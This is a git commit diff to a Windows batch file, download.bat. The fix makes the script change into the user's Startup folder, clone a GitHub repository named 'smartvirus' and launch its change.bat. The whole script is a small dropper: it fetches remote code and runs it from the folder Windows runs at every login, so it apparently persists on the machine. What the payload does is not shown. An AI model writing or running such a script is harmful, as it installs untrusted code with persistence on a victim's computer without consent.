be3ddf1f9a8e8e6e7f1866bcc5583a2c4443c894
AlexisEpsi <152502075+AlexisEpsi@users.noreply.github.com>
2024-01-25 09:29:11 +0100

    Update download.bat

--- download.bat
+++ download.bat
@@ -1,4 +1,4 @@
-AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+cd AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
 git clone https://github.com/mattistjnn/smartvirus
 cd smartvirus
 Start change.bat
